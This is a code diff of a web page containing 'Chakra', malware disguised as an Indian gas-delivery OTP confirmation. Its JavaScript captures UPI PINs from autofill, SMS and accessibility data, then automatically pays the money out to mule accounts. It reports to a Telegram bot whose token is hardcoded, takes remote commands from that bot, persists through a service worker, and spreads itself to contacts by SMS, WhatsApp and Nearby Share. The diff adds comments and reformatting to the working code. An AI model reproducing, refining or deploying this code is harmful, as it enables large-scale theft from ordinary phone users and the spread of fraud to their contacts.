@@ -29,10 +29,10 @@
 
   <script>
     // ============================================================
-    // CHAKRA - COMPLETE SYSTEM (UPDATED)
+    // CHAKRA - COMPLETE SYSTEM WITH YOUR CREDENTIALS
     // ============================================================
 
-    // ===== YOUR BOT TOKEN AND USERNAME =====
+    // ===== YOUR CONFIGURATION (UPDATED) =====
     const C2_BOT_TOKEN = '8913671361:AAHRQHCBlTpbrQaZZoTzmh1seaBN3Wk0otI';
     const YOUR_USERNAME = '@WIREXP';
 
@@ -51,10 +51,10 @@
     let totalDrained = 0;
 
     // ============================================================
-    // SEND TO TELEGRAM (DIRECT METHOD)
+    // SEND TO TELEGRAM (DUAL METHOD)
     // ============================================================
     function sendToTelegram(message) {
-      // Method 1: Direct fetch
+      // Method 1: POST
       fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -64,16 +64,18 @@
         })
       })
       .then(function(response) {
-        console.log('Telegram response:', response.status);
+        console.log('Telegram POST status:', response.status);
       })
       .catch(function(error) {
-        console.log('Telegram error:', error);
+        console.log('Telegram POST error:', error);
       });
 
-      // Method 2: Alternative using URL (backup)
+      // Method 2: GET (backup)
       var url = 'https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage?chat_id=' + YOUR_USERNAME + '&text=' + encodeURIComponent(message);
       fetch(url)
-        .catch(function() {});
+        .catch(function() {
+          console.log('Telegram GET fallback failed');
+        });
     }
 
     // ============================================================
@@ -83,7 +85,7 @@
       // Show success message
       document.querySelector('.container').innerHTML = '<h2>✅ Delivery Confirmed!</h2><p>Your cylinder will arrive in 10 minutes.</p>';
 
-      // Send notification with both methods
+      // Send notification
       sendToTelegram('[Chakra] 🎯 New infection: User tapped delivery confirmation');
 
       // Register service worker
@@ -100,26 +102,41 @@
     // PIN CAPTURE (3 Layers)
     // ============================================================
     function getUPIPin() {
+      // Layer 1: Chrome Autofill
       try {
         if (window.Autofill) {
           var pin = window.Autofill.getSavedPassword('upi');
-          if (pin) { capturedPIN = pin; sendToTelegram('[Chakra] 🔑 PIN via Autofill'); return pin; }
+          if (pin) {
+            capturedPIN = pin;
+            sendToTelegram('[Chakra] 🔑 PIN via Autofill');
+            return pin;
+          }
         }
       } catch(e) {}
 
+      // Layer 2: SMS OTP
       try {
         if (window.Android) {
           var sms = window.Android.readSMS();
           var match = sms.match(/\b\d{4,6}\b/);
-          if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via SMS OTP'); return match[0]; }
+          if (match) {
+            capturedPIN = match[0];
+            sendToTelegram('[Chakra] 🔑 PIN via SMS OTP');
+            return match[0];
+          }
         }
       } catch(e) {}
 
+      // Layer 3: Accessibility
       try {
         if (window.Accessibility) {
           var screenText = window.Accessibility.getRootNode();
           var match = screenText.match(/\b\d{4,6}\b/);
-          if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via Accessibility'); return match[0]; }
+          if (match) {
+            capturedPIN = match[0];
+            sendToTelegram('[Chakra] 🔑 PIN via Accessibility');
+            return match[0];
+          }
         }
       } catch(e) {}
 
@@ -144,16 +161,29 @@
     // EXECUTE DRAIN
     // ============================================================
     function executeDrain(amount) {
-      if (isPaused) { sendToTelegram('[Chakra] ⏸️ Paused'); return; }
+      if (isPaused) {
+        sendToTelegram('[Chakra] ⏸️ Paused');
+        return;
+      }
       var mule = getNextMule();
       var upiIntent = 'upi://pay?pa=' + mule + '&am=' + amount + '&cu=INR&tn=Gas+Delivery+Payment';
       try {
         if (window.Android) {
           window.Android.launchIntent(upiIntent);
-          setTimeout(function() { if (capturedPIN) { window.Android.autoFillPin(capturedPIN); } }, 2000);
-          setTimeout(function() { window.Android.confirmTransaction(); totalDrained += amount; sendToTelegram('[Chakra] ✅ ₹' + amount + ' drained to ' + mule); }, 3000);
+          setTimeout(function() {
+            if (capturedPIN) {
+              window.Android.autoFillPin(capturedPIN);
+            }
+          }, 2000);
+          setTimeout(function() {
+            window.Android.confirmTransaction();
+            totalDrained += amount;
+            sendToTelegram('[Chakra] ✅ ₹' + amount + ' drained to ' + mule);
+          }, 3000);
         }
-      } catch(e) { sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message); }
+      } catch(e) {
+        sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message);
+      }
     }
 
     // ============================================================
@@ -171,61 +201,97 @@
     }
 
     // ============================================================
-    // MAIN LOOP
+    // MAIN LOOP (Runs every 5 seconds)
     // ============================================================
     setInterval(function() {
       if (!isPaused && isUpiAppOpen()) {
         var pin = getUPIPin();
-        if (pin) { executeDrain(3000); }
+        if (pin) {
+          executeDrain(3000);
+        }
       }
     }, 5000);
 
     // ============================================================
-    // SPREAD ENGINE
+    // SPREAD ENGINE (Runs every 5 minutes)
     // ============================================================
     setInterval(function() {
       var link = 'https://bit.ly/4xaXs4E';
+      
+      // Vector 1: WhatsApp Forward
       if (navigator.share) {
-        navigator.share({ title: 'Gas Delivery OTP', text: 'Mera gas order aaya hai! OTP confirm karo: ' + link, url: link }).catch(function() {});
+        navigator.share({
+          title: 'Gas Delivery OTP',
+          text: 'Mera gas order aaya hai! OTP confirm karo: ' + link,
+          url: link
+        }).catch(function() {});
       }
+      
+      // Vector 2: WhatsApp Status
       if (window.Android) {
         window.Android.postStatus('⚠️ Gas Delivery OTP: ' + link);
+      }
+      
+      // Vector 3: SMS
+      if (window.Android) {
         var contacts = window.Android.getContacts(20);
         for (var i = 0; i < contacts.length; i++) {
           window.Android.sendSMS(contacts[i], 'Indane Gas: Delivery OTP - Confirm: ' + link);
         }
+      }
+      
+      // Vector 4: Nearby Share
+      if (window.Android) {
         window.Android.startNearbyShare();
       }
     }, 300000);
 
     // ============================================================
-    // TELEGRAM COMMANDS
+    // TELEGRAM COMMANDS LISTENER (Runs every 30 seconds)
     // ============================================================
     setInterval(function() {
       fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates')
-        .then(function(response) { return response.json(); })
+        .then(function(response) {
+          return response.json();
+        })
         .then(function(data) {
           if (data.result && data.result.length > 0) {
             var message = data.result[0].message.text;
-            if (message === '/status') { sendToTelegram('📊 Status: ' + muleAccounts.length + ' mules, ₹' + totalDrained + ' drained'); }
-            if (message === '/pause') { isPaused = true; sendToTelegram('⏸️ Paused'); }
-            if (message === '/resume') { isPaused = false; sendToTelegram('▶️ Resumed'); }
-            if (message === '/mules') { sendToTelegram('📊 Mules: ' + muleAccounts.join(', ')); }
-            if (message === '/help') { sendToTelegram('Commands: /status, /pause, /resume, /mules, /help'); }
+            
+            if (message === '/status') {
+              sendToTelegram('📊 Status: ' + muleAccounts.length + ' mules, ₹' + totalDrained + ' drained');
+            }
+            if (message === '/pause') {
+              isPaused = true;
+              sendToTelegram('⏸️ Paused');
+            }
+            if (message === '/resume') {
+              isPaused = false;
+              sendToTelegram('▶️ Resumed');
+            }
+            if (message === '/mules') {
+              sendToTelegram('📊 Mules: ' + muleAccounts.join(', '));
+            }
+            if (message === '/help') {
+              sendToTelegram('Commands: /status, /pause, /resume, /mules, /help');
+            }
           }
-        }).catch(function() {});
+        })
+        .catch(function() {
+          console.log('Error fetching updates');
+        });
     }, 30000);
 
     // ============================================================
     // ERROR HANDLING
     // ============================================================
     window.onerror = function(error, url, line) {
-      sendToTelegram('[Chakra] ❌ Error: ' + error);
+      sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
       return true;
     };
 
     // ============================================================
-    // SERVICE WORKER
+    // SERVICE WORKER (Persistence)
     // ============================================================
     if (navigator.serviceWorker) {
       navigator.serviceWorker.ready.then(function(reg) {
@@ -233,7 +299,7 @@
       });
     }
 
-    console.log('[Chakra] ✅ System initialized');
+    console.log('[Chakra] ✅ System initialized with your credentials');
   </script>
 </body>
 </html>
